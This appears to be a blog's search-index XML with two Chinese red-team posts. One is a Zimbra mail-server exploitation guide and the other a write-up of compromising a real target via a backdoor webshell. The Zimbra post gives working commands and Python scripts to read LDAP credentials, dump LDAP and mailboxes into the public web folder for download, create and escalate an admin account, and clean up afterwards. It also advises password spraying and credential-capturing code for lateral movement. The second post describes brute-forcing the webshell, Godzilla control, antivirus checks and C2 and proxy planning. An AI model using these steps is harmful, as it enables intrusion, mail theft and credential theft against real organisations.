<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Zimbra邮件服务器的实战使用Tips</title>
    <link href="/2023/06/08/zimbra-1/"/>
    <url>/2023/06/08/zimbra-1/</url>
    
    <content type="html"><![CDATA[<hr><p>​                                                                                <strong>《  Zimbra邮件服务器的实战使用Tips  》</strong></p><hr><h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p> 总结以前对zimbras邮件服务器系统模拟实战学习的记录，最终目的：能够对Zimbra邮件服务器的资源进行访问和修改，便利实战下的 red team Player。</p><h2 id="二-环境"><a href="#二-环境" class="headerlink" title="二.环境"></a>二.环境</h2><ol><li>ubuntu-14.04.6-desktop</li><li>zimbra 8.6 (高版本也可以)</li></ol><h2 id="三-实战下的利用"><a href="#三-实战下的利用" class="headerlink" title="三.实战下的利用"></a>三.实战下的利用</h2><h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1.搭建环境"></a>1.搭建环境</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs awk">只提供安装的命令行语句：<br><br>ubuntu安装：<br>ubuntu的ISO下载： https:<span class="hljs-regexp">//</span>releases.ubuntu.com<span class="hljs-regexp">/14.04/</span>（ps：内存尽量多给<span class="hljs-number">50</span>g、运行内存、处理器给高）<br><br>apt-get install libgmp10 libperl5.<span class="hljs-number">18</span> unzip pax sysstat sqlite3 dnsmasq wget<br><br><br>vim <span class="hljs-regexp">/etc/</span>hostname<br>mail.test.com<br>或者直接：<br>sudo hostnamectl set-hostname mail.test.com<br><br>vim <span class="hljs-regexp">/etc/</span>hosts<br><span class="hljs-number">192.168</span>.<span class="hljs-number">53.145</span>（ubuntu本机ip）  mail.test.com   mail<br><br>vim <span class="hljs-regexp">/etc/</span>dnsmasq.conf<br>server=<span class="hljs-number">192.168</span>.<span class="hljs-number">53.145</span><br>domain=test.com<br>mx-host=test.com, mail.test.com, <span class="hljs-number">5</span><br>mx-host=mail.test.com, mail.test.com, <span class="hljs-number">5</span><br>listen-address=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br>sudo reboot<br><br>zimbra安装：<br>wget https:<span class="hljs-regexp">//</span>files.zimbra.com<span class="hljs-regexp">/downloads/</span><span class="hljs-number">8.6</span>.<span class="hljs-number">0</span>_GA/zcs-<span class="hljs-number">8.6</span>.<span class="hljs-number">0</span>_GA_1153.UBUNTU14_64.<span class="hljs-number">20141215151116</span>.tgz<br>tar -xvf zcs-<span class="hljs-number">8.6</span>.<span class="hljs-number">0</span>_GA_1153.UBUNTU14_64.<span class="hljs-number">20141215151116</span>.tgz<br><br>wget http:<span class="hljs-regexp">//</span>th.archive.ubuntu.com<span class="hljs-regexp">/ubuntu/</span>pool<span class="hljs-regexp">/universe/g</span><span class="hljs-regexp">/gmp4/</span>libgmp3c2_4.<span class="hljs-number">3.2</span>+dfsg-<span class="hljs-number">2</span>ubuntu1_amd64.deb<br>dpkg -i libgmp3c2_4.<span class="hljs-number">3.2</span>+dfsg-<span class="hljs-number">2</span>ubuntu1_amd64.deb<br><br>sudo ./install.sh  Y zimbra-dnscache:N<br><span class="hljs-number">6</span><br><span class="hljs-number">4</span>   <span class="hljs-regexp">//</span>设置密码<br>a<br>yes<br><br>su - zimbra         <span class="hljs-regexp">//</span>切换用户<br>zmcontrol status   <span class="hljs-regexp">//</span>查看zimbra服务器状态<br><br>https:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">53.145</span>:<span class="hljs-number">7071</span>/zimbraAdmin<br></code></pre></td></tr></table></figure><h3 id="2-实战中zimbra的tips"><a href="#2-实战中zimbra的tips" class="headerlink" title="2.实战中zimbra的tips"></a>2.实战中zimbra的tips</h3><h4 id="A-zimbra的基本简介："><a href="#A-zimbra的基本简介：" class="headerlink" title="A.zimbra的基本简介："></a>A.zimbra的基本简介：</h4><h5 id="（1）Zimbra-SOAP-API的名称："><a href="#（1）Zimbra-SOAP-API的名称：" class="headerlink" title="（1）Zimbra SOAP API的名称："></a>（1）Zimbra SOAP API的名称：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">zimbraAdmin    <span class="hljs-regexp">//</span>管理接口，是管理员权限<br>zimbraAccount  <span class="hljs-regexp">//</span>zimbra用户操作<br>zimbraMail     <span class="hljs-regexp">//</span>zimbra邮箱操作<br>zimbraAdminExt<br>zimbraRepl<br>zimbraSync<br>zimbraVoice<br><br>实战下常使用的的命名空间有三个：<br>zimbraAdmin     <span class="hljs-regexp">//</span>Zimbra邮件服务器的管理接口，需要管理员权限<br>zimbraAccount   <span class="hljs-regexp">//</span>同Zimbra用户相关的操作<br>zimbraMail      <span class="hljs-regexp">//</span>同zimbra邮件的操作<br></code></pre></td></tr></table></figure><h5 id="（2）默认开放的端口有三种："><a href="#（2）默认开放的端口有三种：" class="headerlink" title="（2）默认开放的端口有三种："></a>（2）默认开放的端口有三种：</h5><p>A. 访问邮件：(80或443端口)</p><blockquote><p>对应的地址为：</p><p><a href="https://192.168.53.145/service/soap">https://192.168.53.145/service/soap</a></p><p><a href="http://192.168.53.145/service/soap">http://192.168.53.145/service/soap</a></p></blockquote><p>B.管理面板：（7071端口）</p><blockquote><p>对应的地址为：<a href="https://192.168.53.145:7071/service/admin/soap">https://192.168.53.145:7071/service/admin/soap</a></p></blockquote><p>C.管理面板-&gt;访问邮件：（8443端口）</p><blockquote><p>从管理面板能够读取所有用户的邮件;</p><p>对应的地址为：<a href="https://192.168.53.145:8443/mail?adminPreAuth=1">https://192.168.53.145:8443/mail?adminPreAuth=1</a></p></blockquote><h4 id="B-python脚本对zimbra操作"><a href="#B-python脚本对zimbra操作" class="headerlink" title="B.python脚本对zimbra操作"></a>B.python脚本对zimbra操作</h4><p>实战中，目标可能存在zimbra邮件服务器系统，我们拿下windows的域控后，可能要横向拿邮服上的数据，扩大战果；或者是我们web打点，zimbra用户存在弱口令，拿到某某的账号和密码，就可以进行一些如下操作。</p><h5 id="1-普通用户登录（账号和密码）"><a href="#1-普通用户登录（账号和密码）" class="headerlink" title="1.普通用户登录（账号和密码）"></a>1.普通用户登录（账号和密码）</h5><p>对应的地址为：<a href="https://192.168.53.145/service/soap">https://192.168.53.145/service/soap</a></p><p>获得发件箱邮件数量的例代码：</p><p>PS：首次运行Get-ZimbraAccount.py ，需要安装 pip install python-zimbra模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Get-ZimbraAccount.py</span><br><span class="hljs-keyword">import</span> pythonzimbra.communication<br><span class="hljs-keyword">from</span> pythonzimbra.communication <span class="hljs-keyword">import</span> Communication<br><span class="hljs-keyword">import</span> pythonzimbra.tools<br><span class="hljs-keyword">from</span> pythonzimbra.tools <span class="hljs-keyword">import</span> auth<br><span class="hljs-keyword">import</span> warnings<br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment">#对于自己的测试环境，需要忽略SSL证书验证</span><br><span class="hljs-keyword">import</span> ssl<br>ssl._create_default_https_context = ssl._create_unverified_context<br><br><span class="hljs-comment">#url  = &#x27;url+/service/soap&#x27;</span><br><span class="hljs-comment">#普通用户登录的对应链接</span><br>url  = <span class="hljs-string">&#x27;https://192.168.53.145/service/soap&#x27;</span><br>comm = Communication(url)<br><br><span class="hljs-comment">#使用用户名和口令登录的示例代码如下：</span><br>token = auth.authenticate(<br>    url,<br>    <br><span class="hljs-comment">#普通用户账号</span><br>    <span class="hljs-string">&#x27;test123&#x27;</span>,<br><br><span class="hljs-comment">#普通用户的密码</span><br>    <span class="hljs-string">&#x27;test123..&#x27;</span>,<br>    use_password=<span class="hljs-literal">True</span>,<br>)<br>info_request = comm.gen_request(token=token)<br>info_request.add_request(<br>    <span class="hljs-string">&quot;GetFolderRequest&quot;</span>,<br>    &#123;<br>        <span class="hljs-string">&quot;folder&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/sent&quot;</span><br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;urn:zimbraMail&quot;</span><br>)<br>info_response = comm.send_request(info_request)<br><span class="hljs-built_in">print</span>(info_response.get_response())<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> info_response.is_fault():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;size:%s&quot;</span>%info_response.get_response()[<span class="hljs-string">&#x27;GetFolderResponse&#x27;</span>][<span class="hljs-string">&#x27;folder&#x27;</span>][<span class="hljs-string">&#x27;n&#x27;</span>]),<br></code></pre></td></tr></table></figure><p>结果：</p> <img src="/2023/06/08/zimbra-1/1.png" class="" title="This is an example image"><p>分析：size：是用户发送了多少篇邮件，此处是搭建的环境，发送了一篇，故size为1。</p><h5 id="2-管理员登录（账号和密码）"><a href="#2-管理员登录（账号和密码）" class="headerlink" title="2.管理员登录（账号和密码）"></a>2.管理员登录（账号和密码）</h5><p>对应的地址为：<a href="https://192.168.53.145:7071/service/admin/soap">https://192.168.53.145:7071/service/admin/soap</a></p><p>获得所有邮件用户信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Get-ZimbraAdmin.py</span><br><span class="hljs-keyword">import</span> pythonzimbra.communication<br><span class="hljs-keyword">from</span> pythonzimbra.communication <span class="hljs-keyword">import</span> Communication<br><span class="hljs-keyword">import</span> pythonzimbra.tools<br><span class="hljs-keyword">from</span> pythonzimbra.tools <span class="hljs-keyword">import</span> auth<br><span class="hljs-keyword">import</span> warnings<br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment">#对于自己的测试环境，需要忽略SSL证书验证</span><br><span class="hljs-keyword">import</span> ssl<br>ssl._create_default_https_context = ssl._create_unverified_context<br><br><span class="hljs-comment">#url = url+/service/admin/soap</span><br><span class="hljs-comment">#管理员登录的对应链接</span><br>url  = <span class="hljs-string">&#x27;https://192.168.53.145:7071/service/admin/soap&#x27;</span><br>comm = Communication(url)<br><br><span class="hljs-comment">#使用preauth-key登录</span><br>token = auth.authenticate(<br>    url,<br>    <br>    <span class="hljs-comment">#管理员的账号</span><br>    <span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-comment">#管理员的密码</span><br>    <span class="hljs-string">&#x27;akali123456&#x27;</span>,<br>    use_password=<span class="hljs-literal">True</span>,<br>    admin_auth=<span class="hljs-literal">True</span>, <br>)<br><br><br>info_request = comm.gen_request(token=token)<br>info_request.add_request(<br>    <span class="hljs-string">&quot;GetAllAccountsRequest&quot;</span>,<br>    &#123;<br>        <br>    &#125;,<br>    <span class="hljs-string">&quot;urn:zimbraAdmin&quot;</span><br>)<br>info_response = comm.send_request(info_request)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> info_response.is_fault():<br>    <span class="hljs-built_in">print</span>(info_response.get_response()[<span class="hljs-string">&#x27;GetAllAccountsResponse&#x27;</span>]),<br></code></pre></td></tr></table></figure><p>结果：</p> <img src="/2023/06/08/zimbra-1/2.png" class="" title="This is an example image"><h4 id="C-实战常用命令"><a href="#C-实战常用命令" class="headerlink" title="C.实战常用命令"></a>C.实战常用命令</h4><h5 id="1-列举所有用户："><a href="#1-列举所有用户：" class="headerlink" title="1.列举所有用户："></a>1.列举所有用户：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov -l gaa<br></code></pre></td></tr></table></figure> <img src="/2023/06/08/zimbra-1/3.png" class="" title="This is an example image"><h5 id="2-列举管理员："><a href="#2-列举管理员：" class="headerlink" title="2.列举管理员："></a>2.列举管理员：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov -l gaaa<br></code></pre></td></tr></table></figure> <img src="/2023/06/08/zimbra-1/4.png" class="" title="This is an example image"><h5 id="3-查询服务器邮箱使用情况："><a href="#3-查询服务器邮箱使用情况：" class="headerlink" title="3.查询服务器邮箱使用情况："></a>3.查询服务器邮箱使用情况：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov gqu mail.test.com<br></code></pre></td></tr></table></figure> <img src="/2023/06/08/zimbra-1/5.png" class="" title="This is an example image"><h5 id="4-获取ldap密码："><a href="#4-获取ldap密码：" class="headerlink" title="4.获取ldap密码："></a>4.获取ldap密码：</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmlocalconfig -s |<span class="hljs-keyword">grep</span> zimbra_ldap<br></code></pre></td></tr></table></figure> <img src="/2023/06/08/zimbra-1/6.png" class="" title="This is an example image"><h5 id="5-获取ldap服务器地址："><a href="#5-获取ldap服务器地址：" class="headerlink" title="5.获取ldap服务器地址："></a>5.获取ldap服务器地址：</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmlocalconfig -s | <span class="hljs-keyword">grep</span> ldap_url<br></code></pre></td></tr></table></figure> <img src="/2023/06/08/zimbra-1/7.png" class="" title="This is an example image"><h5 id="6-zimbra-web路径："><a href="#6-zimbra-web路径：" class="headerlink" title="6.zimbra web路径："></a>6.zimbra web路径：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/jetty/</span>webapps<span class="hljs-regexp">/public/</span><br></code></pre></td></tr></table></figure> <img src="/2023/06/08/zimbra-1/8.png" class="" title="This is an example image"><h5 id="7-导出ldap（需要ldap密码和ldap服务器地址）："><a href="#7-导出ldap（需要ldap密码和ldap服务器地址）：" class="headerlink" title="7.导出ldap（需要ldap密码和ldap服务器地址）："></a>7.导出ldap（需要ldap密码和ldap服务器地址）：</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/common/</span>bin<span class="hljs-regexp">/ldapsearch -x -H  ldap:/</span><span class="hljs-regexp">/mail.test.com:389 -D &quot;uid=zimbra,cn=admins,cn=zimbra&quot; -w u2rCl9JN6_ &gt; /</span>opt<span class="hljs-regexp">/zimbra/</span>jetty<span class="hljs-regexp">/webapps/</span>zimbra<span class="hljs-regexp">/public/</span>jsp/ldap.tar<br><br>文件拖回来后删除导出的压缩包:<br>rm -f <span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/jetty/</span>webapps<span class="hljs-regexp">/zimbra/</span><span class="hljs-keyword">public</span><span class="hljs-regexp">/jsp/</span>ldap.tar<br></code></pre></td></tr></table></figure> <img src="/2023/06/08/zimbra-1/9.png" class="" title="This is an example image"><h5 id="8-新建用户-并提升用户至管理员-："><a href="#8-新建用户-并提升用户至管理员-：" class="headerlink" title="8.新建用户(并提升用户至管理员)："></a>8.新建用户(并提升用户至管理员)：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov ca test123@mail.test.com test123..                    <span class="hljs-regexp">//</span>新建用户<br><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov ma test123@mail.test.com zimbraIsAdminAccount TRUE    <span class="hljs-regexp">//</span>提升为管理员<br></code></pre></td></tr></table></figure><h5 id="9-查询用户详情："><a href="#9-查询用户详情：" class="headerlink" title="9.查询用户详情："></a>9.查询用户详情：</h5><figure class="highlight graphql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs graphql">/opt/zimbra/bin/zmsoap -z -v SearchDirectoryRequest <span class="hljs-meta">@offset</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;0&quot;</span> <span class="hljs-meta">@limit</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;5000&quot;</span> <span class="hljs-meta">@sortBy</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;name&quot;</span> <span class="hljs-meta">@sortAscending</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;1&quot;</span> <span class="hljs-meta">@applyCos</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;false&quot;</span> <span class="hljs-meta">@applyConfig</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;false&quot;</span> <span class="hljs-meta">@attrs</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;givenName,displayName,zimbraAccountStatus,sn,cn,description,ZimbraCreateTimestamp,zimbraCOSId,zimbraLastLogonTimestamp&quot;</span> <span class="hljs-meta">@types</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;accounts&quot;</span> <span class="hljs-meta">@maxResults</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;5000&quot;</span> <span class="hljs-keyword">query</span><span class="hljs-punctuation">=</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h5 id="10-导出邮件的方法："><a href="#10-导出邮件的方法：" class="headerlink" title="10.导出邮件的方法："></a>10.导出邮件的方法：</h5><h6 id="（1）命令导出："><a href="#（1）命令导出：" class="headerlink" title="（1）命令导出："></a>（1）命令导出：</h6><p>导出指定时间的邮件 DD&#x2F;MM&#x2F;YY</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmmailbox -z -m test123@mail.test.com getRestURL <span class="hljs-string">&quot;//?fmt=tgz&amp;query=after:07/06/2023&quot;</span> &gt; <span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/jetty/</span>webapps<span class="hljs-regexp">/zimbra/</span><span class="hljs-keyword">public</span>/test123.tar<br></code></pre></td></tr></table></figure><h6 id="（2）账号密码"><a href="#（2）账号密码" class="headerlink" title="（2）账号密码"></a>（2）账号密码</h6><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">登录web导出<br>foxmail导出(pop3<span class="hljs-built_in"> or </span>imap/smtp)<br></code></pre></td></tr></table></figure><h6 id="（3）7071端口导出（仅需管理员账号和密码）"><a href="#（3）7071端口导出（仅需管理员账号和密码）" class="headerlink" title="（3）7071端口导出（仅需管理员账号和密码）"></a>（3）7071端口导出（仅需管理员账号和密码）</h6><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//m</span>ail.test.com:<span class="hljs-number">7071</span> <br></code></pre></td></tr></table></figure><h5 id="11-zimbra邮件服务器的横向移动，扩大战果"><a href="#11-zimbra邮件服务器的横向移动，扩大战果" class="headerlink" title="11.zimbra邮件服务器的横向移动，扩大战果"></a>11.zimbra邮件服务器的横向移动，扩大战果</h5><p>（1）查看邮服ldap文件，如果zimbra邮件服务器配置了域控，就会存在域管密码，拿下域管结束。</p><p>（2）将ldap中的邮箱全部用户名拖取出来（拖取全局联系人），扫描内网ldap端口，进行域用户枚举，然后进行密码喷洒，工具：<a href="https://github.com/ropnop/kerbrute%E3%80%82">https://github.com/ropnop/kerbrute。</a></p><p>（3）恶意代码捕获web界面密码，有可能捕获到域管密码，尝试登录，或者对普通用户操作，就是想法设法扩大战果。</p><p>（3）扫内网，定位核心段等等。</p>]]></content>
    
    
    <categories>
      
      <category>Zimbra</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实战——利用XX盘开发者留的后门get websell</title>
    <link href="/2023/06/04/targetXX/"/>
    <url>/2023/06/04/targetXX/</url>
    
    <content type="html"><![CDATA[<hr><p>​                                           <strong>《 实战：利用XX盘开发者留的后门Get Webshell 》</strong></p><hr><h2 id="一-web"><a href="#一-web" class="headerlink" title="一.web"></a>一.web</h2><p>目标：<a href="https://xx.com/">https://xx.com</a></p><h3 id="1-web打点"><a href="#1-web打点" class="headerlink" title="1.web打点"></a>1.web打点</h3><p> 对目标进行信息收集：资产探测、web指纹、暴露的web资产、中间件漏洞、相关联的资产等进行全网信息收集。</p><h4 id="1-1-打点思路："><a href="#1-1-打点思路：" class="headerlink" title="1.1 打点思路："></a>1.1 打点思路：</h4><p>信息收集完后，一套红队的web打点手法操作，发现没有利用的点，一般某盘都是二开的，web狗看了都要摇头，从主站暴露好少东西，做了CND，直接写死（静态的html）没有点位进入，只能关注旁站或者子站，也做了CDN，最后dirsearch爆破旁站敏感目录时，发现一个敏感目录：&#x2F;xx.aa&#x2F;config.php，访问后发现是开发者留下的后门。</p><p>（1）访问 <a href="https://xx.com/xx.aa/config.php">https://xx.com/xx.aa/config.php</a> 时，我以为是某个前辈留下的webshell，尝试使用7kb的一句话木马爆破工具，去爆破密码，结果：失败，不是前辈留下的。</p><p>（2）burp抓包，进行爆破，使用实战常见的密码进行爆破，结果：失败。</p><p>（3）操作了一些极端的手法之后，结果：失败。</p><p>（4）最后，感觉xx.com有些怪，将xx设置为爆破密码，就成功了。真是玄学，直接get webshell。</p><h4 id="1-2-哥斯拉-godzilla-连接webshell"><a href="#1-2-哥斯拉-godzilla-连接webshell" class="headerlink" title="1.2 哥斯拉(godzilla)连接webshell"></a>1.2 哥斯拉(godzilla)连接webshell</h4><img src="/2023/06/04/targetXX/1.png" class="" title="This is an example image"><h3 id="2-基于Webshell下的操作"><a href="#2-基于Webshell下的操作" class="headerlink" title="2.基于Webshell下的操作"></a>2.基于Webshell下的操作</h3><h4 id="2-1-查看当前的用户权限"><a href="#2-1-查看当前的用户权限" class="headerlink" title="2.1 查看当前的用户权限"></a>2.1 查看当前的用户权限</h4><blockquote><p>whoami</p></blockquote><img src="/2023/06/04/targetXX/2.png" class="" title="This is an example image"><p>当前是：system权限，那不是后期直接上线CS，点点就行了，如果有域就可以遨游整个内网了。</p><p>查看存在杀软情况，方便选择需要上传免杀CS的后门和 走socks协议将流量代理回来的(frp+Proxifier)，流量代理还有别的科技打法。</p><p>PS：上传C2马和流量代理 —— 连接 webshell需要优先做好<strong>权限维持</strong>，不然权限掉了GG。</p><h4 id="2-2-查看运行程序"><a href="#2-2-查看运行程序" class="headerlink" title="2.2 查看运行程序"></a>2.2 查看运行程序</h4><blockquote><p>tasklist &#x2F;svc</p></blockquote><img src="/2023/06/04/targetXX/3.png" class="" title="This is an example image"><h4 id="2-3-利用在线识别杀软的网站："><a href="#2-3-利用在线识别杀软的网站：" class="headerlink" title="2.3 利用在线识别杀软的网站："></a>2.3 利用在线识别杀软的网站：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.ddosi.org<span class="hljs-regexp">/av/</span><span class="hljs-number">1</span>.php<br>http:<span class="hljs-regexp">//</span>payloads.net<span class="hljs-regexp">/kill_software/</span><br></code></pre></td></tr></table></figure><p> 将godzilla上执行 tasklist &#x2F;svc的结果复制到在线识别杀软网站：</p><blockquote><p>结果：存在 windows defender杀软 （MsMpEng.exe）</p></blockquote><img src="/2023/06/04/targetXX/4.png" class="" title="This is an example image"><h4 id="2-4-查看是否出网和出网的协议"><a href="#2-4-查看是否出网和出网的协议" class="headerlink" title="2.4 查看是否出网和出网的协议"></a>2.4 查看是否出网和出网的协议</h4><h5 id="A-使用ping命令查看是否出网："><a href="#A-使用ping命令查看是否出网：" class="headerlink" title="A.使用ping命令查看是否出网："></a>A.使用ping命令查看是否出网：</h5><blockquote><p>ping <a href="http://www.google.com/">www.google.com</a> -n  1   或者  ping <a href="http://www.baidu.com/">www.baidu.com</a> -n 1</p></blockquote><img src="/2023/06/04/targetXX/5.png" class="" title="This is an example image"><p>结果是出网的，并且出网协议是：ICMP。</p><h5 id="B-实战角度判断主机是否出网的判断"><a href="#B-实战角度判断主机是否出网的判断" class="headerlink" title="B.实战角度判断主机是否出网的判断"></a>B.实战角度判断主机是否出网的判断</h5><p>协议：icmp、tcp、udp、http&#x2F;https、dns</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs armasm">第<span class="hljs-number">1</span>种协议：ICMP：<br><span class="hljs-symbol">ping</span> <span class="hljs-built_in">ip</span>/domain <br><span class="hljs-symbol">tracert</span> <span class="hljs-built_in">ip</span>/domain<br><br>第<span class="hljs-number">2</span>种协议：TCP<br><span class="hljs-symbol">nc</span> <span class="hljs-built_in">ip</span> port<br><span class="hljs-symbol">nc</span> -zv <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">80</span><br>或<br><span class="hljs-symbol">telnet</span> <span class="hljs-built_in">ip</span> port<br><span class="hljs-symbol">nc</span> -zv <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">80</span><br><br>第<span class="hljs-number">3</span>种协议：UDP<br><span class="hljs-symbol">nc</span> <span class="hljs-built_in">ip</span> port<br><span class="hljs-symbol">nc</span> -zuv <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span 